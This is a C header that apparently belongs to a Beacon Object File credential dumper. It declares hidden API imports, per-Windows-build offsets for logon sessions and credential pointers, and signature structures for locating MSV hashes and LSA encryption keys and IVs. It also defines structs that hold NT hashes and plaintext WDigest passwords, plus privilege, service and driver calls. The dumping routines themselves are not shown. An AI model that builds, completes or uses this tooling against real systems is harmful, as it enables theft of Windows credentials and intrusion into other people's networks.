#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <windows.h>
#include <stdint.h>
#include <string.h>
#include <stdarg.h>

#include "beacon.h"

// ----------------------------------------------------------------
// BCrypt types and constants (no #include <bcrypt.h> - we use DFR)
// ----------------------------------------------------------------
#ifndef NTSTATUS
typedef LONG NTSTATUS;
typedef NTSTATUS *PNTSTATUS;
#endif
#ifndef BCRYPT_SUCCESS
#define BCRYPT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
#define BCRYPT_SHA256_ALGORITHM L"SHA256"
#define BCRYPT_AES_ALGORITHM    L"AES"
#define BCRYPT_3DES_ALGORITHM   L"3DES"
#define BCRYPT_CHAINING_MODE    L"ChainingMode"
#define BCRYPT_CHAIN_MODE_CBC   L"ChainingModeCBC"
#define BCRYPT_CHAIN_MODE_ECB   L"ChainingModeECB"
typedef PVOID BCRYPT_ALG_HANDLE;
typedef PVOID BCRYPT_HASH_HANDLE;
typedef PVOID BCRYPT_KEY_HANDLE;
typedef PVOID BCRYPT_HANDLE;

// ----------------------------------------------------------------
// MSVCRT forward declarations (needed by inline helpers below)
// ----------------------------------------------------------------
WINBASEAPI void* __cdecl MSVCRT$memcpy(void* __restrict__, const void* __restrict__, size_t);
WINBASEAPI void* __cdecl MSVCRT$memset(void*, int, size_t);
WINBASEAPI int   __cdecl MSVCRT$memcmp(const void*, const void*, size_t);
WINBASEAPI void* __cdecl MSVCRT$malloc(size_t);
WINBASEAPI void  __cdecl MSVCRT$free(void*);

// ----------------------------------------------------------------
// Read helpers (unaligned safe via memcpy)
// ----------------------------------------------------------------
uint16_t rw(const uint8_t* d, size_t o) {
    uint16_t v; MSVCRT$memcpy(&v, d + o, 2); return v;
}
uint32_t rd(const uint8_t* d, size_t o) {
    uint32_t v; MSVCRT$memcpy(&v, d + o, 4); return v;
}
int32_t ri(const uint8_t* d, size_t o) {
    int32_t v; MSVCRT$memcpy(&v, d + o, 4); return v;
}
uint64_t rp(const uint8_t* d, size_t o) {
    uint64_t v; MSVCRT$memcpy(&v, d + o, 8); return v;
}

// ----------------------------------------------------------------
// Byte buffer (dynamic array of uint8_t)
// ----------------------------------------------------------------
typedef struct {
    uint8_t* data;
    size_t   size;
    size_t   capacity;
} Bytes;

Bytes Bytes_alloc(size_t cap) {
    Bytes b;
    b.data = (uint8_t*)MSVCRT$malloc(cap);
    b.size = 0;
    b.capacity = cap;
    return b;
}

Bytes Bytes_zeros(size_t sz) {
    Bytes b;
    b.data = (uint8_t*)MSVCRT$malloc(sz);
    if (b.data) MSVCRT$memset(b.data, 0, sz);
    b.size = sz;
    b.capacity = sz;
    return b;
}

void Bytes_free(Bytes* b) {
    if (b->data) { MSVCRT$free(b->data); b->data = NULL; }
    b->size = 0; b->capacity = 0;
}

int Bytes_empty(const Bytes* b) {
    return (b->data == NULL || b->size == 0);
}

Bytes Bytes_copy(const uint8_t* src, size_t sz) {
    Bytes b;
    b.data = (uint8_t*)MSVCRT$malloc(sz);
    if (b.data && sz) MSVCRT$memcpy(b.data, src, sz);
    b.size = sz;
    b.capacity = sz;
    return b;
}

Bytes Bytes_clone(const Bytes* src) {
    return Bytes_copy(src->data, src->size);
}

// ----------------------------------------------------------------
// information result
// ----------------------------------------------------------------
#define MAX_STR_LEN  512

typedef struct {
    wchar_t  user[MAX_STR_LEN];
    wchar_t  domain[MAX_STR_LEN];
    char     nt_hash[64];
    char     sha_hash[64];
} information;

// ----------------------------------------------------------------
// WDigest information
// ----------------------------------------------------------------
typedef struct {
    wchar_t  user[MAX_STR_LEN];
    wchar_t  domain[MAX_STR_LEN];
    wchar_t  password[MAX_STR_LEN];
} WDigestinformation;

// ----------------------------------------------------------------
// Session struct offsets per build
// ----------------------------------------------------------------
typedef struct {
    uint32_t luid;
    uint32_t user;
    uint32_t domain;
    uint32_t logon_type;
    uint32_t cred_ptr;
} SessionOffsets;

SessionOffsets session_offsets(uint32_t build) {
    SessionOffsets o;
    if (build >= 22000)      { o.luid=0x70; o.user=0xA0; o.domain=0xB0; o.logon_type=0xE8; o.cred_ptr=0x118; }
    else if (build >= 9600)  { o.luid=0x70; o.user=0x90; o.domain=0xA0; o.logon_type=0xD0; o.cred_ptr=0x108; }
    else if (build >= 7601)  { o.luid=0x58; o.user=0x78; o.domain=0x88; o.logon_type=0xBC; o.cred_ptr=0xF0;  }
    else                     { o.luid=0x48; o.user=0x68; o.domain=0x78; o.logon_type=0xAC; o.cred_ptr=0xE0;  }
    return o;
}

// ----------------------------------------------------------------
// MSV signature entry
// ----------------------------------------------------------------
typedef struct {
    const uint8_t* pattern;
    size_t         pattern_len;
    int32_t        fe_off;
    int32_t        cnt_off;
    int32_t        corr_off;
    uint32_t       min_build;
} MsvSig;

// ----------------------------------------------------------------
// LSA signature entry
// ----------------------------------------------------------------
typedef struct {
    const uint8_t* pattern;
    size_t         pattern_len;
    int32_t        iv_off;
    int32_t        des_off;
    int32_t        aes_off;
    uint32_t       hk_off;
} LsaSig;

// ----------------------------------------------------------------
// Hex formatting
// ----------------------------------------------------------------
void to_hex(char* out, size_t out_len, const uint8_t* data, size_t data_len) {
    const char hex[] = "0123456789abcdef";
    size_t i;
    size_t max = data_len;
    if (max * 2 + 1 > out_len) max = (out_len - 1) / 2;
    for (i = 0; i < max; i++) {
        out[i*2]     = hex[(data[i] >> 4) & 0xF];
        out[i*2 + 1] = hex[data[i] & 0xF];
    }
    out[max*2] = '\0';
}

// ----------------------------------------------------------------
// DFR declarations (KERNEL32, NTDLL, MSVCRT, ADVAPI32, BCRYPT)
// ----------------------------------------------------------------

// KERNEL32
WINBASEAPI BOOL WINAPI KERNEL32$FreeLibrary(HMODULE hLibModule);
#define FreeLibrary KERNEL32$FreeLibrary

WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
#define LoadLibraryA KERNEL32$LoadLibraryA

WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);
#define GetLastError KERNEL32$GetLastError

WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
#define GetProcAddress KERNEL32$GetProcAddress

WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR lpModuleName);
#define GetModuleHandleA KERNEL32$GetModuleHandleA

WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleW(LPCWSTR lpModuleName);
#define GetModuleHandleW KERNEL32$GetModuleHandleW

WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSec, DWORD dwCreation, DWORD dwFlags, HANDLE hTemplate);
#define CreateFileW KERNEL32$CreateFileW

WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
#define CloseHandle KERNEL32$CloseHandle

WINBASEAPI BOOL WINAPI KERNEL32$DeviceIoControl(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);
#define DeviceIoControl KERNEL32$DeviceIoControl

WINBASEAPI BOOL WINAPI KERNEL32$WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
#define WriteFile KERNEL32$WriteFile

WINBASEAPI BOOL WINAPI KERNEL32$DeleteFileW(LPCWSTR lpFileName);
#define DeleteFileW KERNEL32$DeleteFileW

WINBASEAPI DWORD WINAPI KERNEL32$GetSystemWindowsDirectoryW(LPWSTR lpBuffer, UINT uSize);
#define GetSystemWindowsDirectoryW KERNEL32$GetSystemWindowsDirectoryW

WINBASEAPI UINT WINAPI KERNEL32$GetSystemDirectoryW(LPWSTR lpBuffer, UINT uSize);
#define GetSystemDirectoryW KERNEL32$GetSystemDirectoryW

WINBASEAPI DWORD WINAPI KERNEL32$GetModuleFileNameW(HMODULE hModule, LPWSTR lpFilename, DWORD nSize);
#define GetModuleFileNameW KERNEL32$GetModuleFileNameW

WINBASEAPI BOOL WINAPI KERNEL32$QueryDosDeviceW(LPCWSTR lpDeviceName, LPWSTR lpTargetPath, DWORD ucchMax);
#define QueryDosDeviceW KERNEL32$QueryDosDeviceW

WINBASEAPI void WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
#define Sleep KERNEL32$Sleep

WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(VOID);
#define GetCurrentProcess KERNEL32$GetCurrentProcess

WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId(VOID);
#define GetCurrentProcessId KERNEL32$GetCurrentProcessId

WINBASEAPI BOOL WINAPI KERNEL32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
#define OpenProcessToken KERNEL32$OpenProcessToken

WINBASEAPI BOOL WINAPI KERNEL32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
#define GetTokenInformation KERNEL32$GetTokenInformation

WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
#define OpenProcess KERNEL32$OpenProcess

WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalAlloc(UINT uFlags, SIZE_T dwBytes);
#define GlobalAlloc KERNEL32$GlobalAlloc

WINBASEAPI HGLOBAL WINAPI KERNEL32$GlobalFree(HGLOBAL hMem);
#define GlobalFree KERNEL32$GlobalFree

WINBASEAPI int WINAPI KERNEL32$WideCharToMultiByte(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
#define WideCharToMultiByte KERNEL32$WideCharToMultiByte

WINBASEAPI void* WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
#define HeapAlloc KERNEL32$HeapAlloc

WINBASEAPI BOOL WINAPI KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
#define HeapFree KERNEL32$HeapFree

WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap(VOID);
#define GetProcessHeap KERNEL32$GetProcessHeap

WINBASEAPI BOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
#define ReadFile KERNEL32$ReadFile

WINBASEAPI DWORD WINAPI KERNEL32$GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
#define GetFileSize KERNEL32$GetFileSize

WINBASEAPI BOOL WINAPI KERNEL32$GetFileAttributesExW(LPCWSTR lpFileName, GET_FILEEX_INFO_LEVELS fInfoLevelId, LPVOID lpFileInformation);
#define GetFileAttributesExW KERNEL32$GetFileAttributesExW

// NTDLL
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$NtQuerySystemInformation(ULONG SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
#define NtQuerySystemInformation NTDLL$NtQuerySystemInformation

WINBASEAPI VOID WINAPI NTDLL$RtlGetNtVersionNumbers(DWORD *MajorVersion, DWORD *MinorVersion, DWORD *BuildNumber);
#define RtlGetNtVersionNumbers NTDLL$RtlGetNtVersionNumbers

WINBASEAPI NTSTATUS NTAPI NTDLL$RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
#define RtlAdjustPrivilege NTDLL$RtlAdjustPrivilege

// MSVCRT (string/format functions; memcpy/memset/memcmp/malloc/free declared above)
WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t* _Str);
WINBASEAPI size_t __cdecl MSVCRT$strlen(const char* _Str);
WINBASEAPI int   __cdecl MSVCRT$sprintf(char* __stream, const char* __format, ...);
WINBASEAPI int   __cdecl MSVCRT$_wcsicmp(const wchar_t* s1, const wchar_t* s2);
WINBASEAPI int   __cdecl MSVCRT$wcscpy_s(wchar_t* dst, size_t sz, const wchar_t* src);
WINBASEAPI int   __cdecl MSVCRT$wcsncpy_s(wchar_t* dst, size_t dstsz, const wchar_t* src, size_t count);
WINBASEAPI char* __cdecl MSVCRT$strstr(const char* hay, const char* needle);
WINBASEAPI wchar_t* __cdecl MSVCRT$wcscat_s(wchar_t* dst, size_t dstsz, const wchar_t* src);
WINBASEAPI int   __cdecl MSVCRT$wcsncpy(wchar_t* dst, const wchar_t* src, size_t count);
WINBASEAPI int   __cdecl MSVCRT$vsnprintf(char* buf, size_t count, const char* fmt, va_list args);

// ADVAPI32
WINADVAPI BOOL WINAPI ADVAPI32$OpenProcessToken2(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);

WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenSCManagerW(LPCWSTR lpMachineName, LPCWSTR lpDatabaseName, DWORD dwDesiredAccess);
#define OpenSCManagerW ADVAPI32$OpenSCManagerW

WINADVAPI SC_HANDLE WINAPI ADVAPI32$OpenServiceW(SC_HANDLE hSCManager, LPCWSTR lpServiceName, DWORD dwDesiredAccess);
#define OpenServiceW ADVAPI32$OpenServiceW

WINADVAPI SC_HANDLE WINAPI ADVAPI32$CreateServiceW(SC_HANDLE hSCManager, LPCWSTR lpServiceName, LPCWSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCWSTR lpBinaryPathName, LPCWSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCWSTR lpDependencies, LPCWSTR lpServiceStartName, LPCWSTR lpPassword);
#define CreateServiceW ADVAPI32$CreateServiceW

WINADVAPI BOOL WINAPI ADVAPI32$StartServiceW(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCWSTR* lpServiceArgVectors);
#define StartServiceW ADVAPI32$StartServiceW

WINADVAPI BOOL WINAPI ADVAPI32$QueryServiceConfigW(SC_HANDLE hService, LPQUERY_SERVICE_CONFIGW lpServiceConfig, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
#define QueryServiceConfigW ADVAPI32$QueryServiceConfigW

WINADVAPI BOOL WINAPI ADVAPI32$ChangeServiceConfigW(SC_HANDLE hService, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCWSTR lpBinaryPathName, LPCWSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCWSTR lpDependencies, LPCWSTR lpServiceStartName, LPCWSTR lpPassword, LPCWSTR lpDisplayName);
#define ChangeServiceConfigW ADVAPI32$ChangeServiceConfigW

WINADVAPI BOOL WINAPI ADVAPI32$ControlService(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
#define ControlService ADVAPI32$ControlService

WINADVAPI BOOL WINAPI ADVAPI32$DeleteService(SC_HANDLE hService);
#define DeleteService ADVAPI32$DeleteService

WINADVAPI BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE hSCObject);
#define CloseServiceHandle ADVAPI32$CloseServiceHandle

WINADVAPI LONG WINAPI ADVAPI32$RegOpenKeyExW(HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
#define RegOpenKeyExW ADVAPI32$RegOpenKeyExW

WINADVAPI LONG WINAPI ADVAPI32$RegQueryValueExW(HKEY hKey, LPCWSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
#define RegQueryValueExW ADVAPI32$RegQueryValueExW

WINADVAPI LONG WINAPI ADVAPI32$RegSetValueExW(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE* lpData, DWORD cbData);
#define RegSetValueExW ADVAPI32$RegSetValueExW

WINADVAPI LONG WINAPI ADVAPI32$RegCloseKey(HKEY hKey);
#define RegCloseKey ADVAPI32$RegCloseKey

// BCrypt (via DFR)
WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptOpenAlgorithmProvider(BCRYPT_ALG_HANDLE *phAlgorithm, LPCWSTR pszAlgId, LPCWSTR pszImplementation, ULONG dwFlags);
#define BCryptOpenAlgorithmProvider BCRYPT$BCryptOpenAlgorithmProvider

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptCreateHash(BCRYPT_ALG_HANDLE hAlgorithm, BCRYPT_HASH_HANDLE *phHash, PUCHAR pbHashObject, ULONG cbHashObject, PUCHAR pbSecret, ULONG cbSecret, ULONG dwFlags);
#define BCryptCreateHash BCRYPT$BCryptCreateHash

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptHashData(BCRYPT_HASH_HANDLE hHash, PUCHAR pbInput, ULONG cbInput, ULONG dwFlags);
#define BCryptHashData BCRYPT$BCryptHashData

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptFinishHash(BCRYPT_HASH_HANDLE hHash, PUCHAR pbOutput, ULONG cbOutput, ULONG dwFlags);
#define BCryptFinishHash BCRYPT$BCryptFinishHash

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDestroyHash(BCRYPT_HASH_HANDLE hHash);
#define BCryptDestroyHash BCRYPT$BCryptDestroyHash

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptGenerateSymmetricKey(BCRYPT_ALG_HANDLE hAlgorithm, BCRYPT_KEY_HANDLE *phKey, PUCHAR pbKeyObject, ULONG cbKeyObject, PUCHAR pbSecret, ULONG cbSecret, ULONG dwFlags);
#define BCryptGenerateSymmetricKey BCRYPT$BCryptGenerateSymmetricKey

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDecrypt(BCRYPT_KEY_HANDLE hKey, PUCHAR pbInput, ULONG cbInput, VOID *pPaddingInfo, PUCHAR pbIV, ULONG cbIV, PUCHAR pbOutput, ULONG cbOutput, ULONG *pcbResult, ULONG dwFlags);
#define BCryptDecrypt BCRYPT$BCryptDecrypt

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptEncrypt(BCRYPT_KEY_HANDLE hKey, PUCHAR pbInput, ULONG cbInput, VOID *pPaddingInfo, PUCHAR pbIV, ULONG cbIV, PUCHAR pbOutput, ULONG cbOutput, ULONG *pcbResult, ULONG dwFlags);
#define BCryptEncrypt BCRYPT$BCryptEncrypt

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptCloseAlgorithmProvider(BCRYPT_ALG_HANDLE hAlgorithm, ULONG dwFlags);
#define BCryptCloseAlgorithmProvider BCRYPT$BCryptCloseAlgorithmProvider

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptDestroyKey(BCRYPT_KEY_HANDLE hKey);
#define BCryptDestroyKey BCRYPT$BCryptDestroyKey

WINBASEAPI NTSTATUS WINAPI BCRYPT$BCryptSetProperty(BCRYPT_HANDLE hObject, LPCWSTR pszProperty, PUCHAR pbInput, ULONG cbInput, ULONG dwFlags);
#define BCryptSetProperty BCRYPT$BCryptSetProperty

// PSAPI
DECLSPEC_IMPORT BOOL WINAPI PSAPI$EnumDeviceDrivers(LPVOID *lpImageBase, DWORD cb, LPDWORD lpcbNeeded);
#define EnumDeviceDrivers PSAPI$EnumDeviceDrivers

// ----------------------------------------------------------------
// Centralized output buffer
// ----------------------------------------------------------------
#define bufsize    65536
#define intAlloc(s) MSVCRT$malloc(s)
#define intFree(p)  MSVCRT$free(p)

static char* output         = NULL;
static int   currentoutsize = 0;

void printoutput(BOOL done)
{
    BeaconOutput(CALLBACK_OUTPUT, output, currentoutsize);
    currentoutsize = 0;
    MSVCRT$memset(output, 0, bufsize);
    if (done) { MSVCRT$free(output); output = NULL; }
}

void internal_printf(const char* format, ...)
{
    int   buffersize    = 0;
    char* curloc        = NULL;
    char* intBuffer     = NULL;
    char* transferBuffer = (char*)intAlloc(bufsize);
    va_list args;

    va_start(args, format);
    buffersize = MSVCRT$vsnprintf(NULL, 0, format, args);
    va_end(args);

    intBuffer = (char*)intAlloc(buffersize);

    va_start(args, format);
    MSVCRT$vsnprintf(intBuffer, buffersize, format, args);
    va_end(args);

    if (buffersize + currentoutsize < bufsize)
    {
        MSVCRT$memcpy(output + currentoutsize, intBuffer, buffersize);
        currentoutsize += buffersize;
    }
    else
    {
        curloc = intBuffer;
        while (buffersize > 0)
        {
            int transfersize = bufsize - currentoutsize;
            if (buffersize < transfersize)
                transfersize = buffersize;
            MSVCRT$memcpy(output + currentoutsize, curloc, transfersize);
            currentoutsize += transfersize;
            if (currentoutsize == bufsize)
                printoutput(FALSE);
            MSVCRT$memset(transferBuffer, 0, transfersize);
            curloc     += transfersize;
            buffersize -= transfersize;
        }
    }

    intFree(intBuffer);
    intFree(transferBuffer);
}
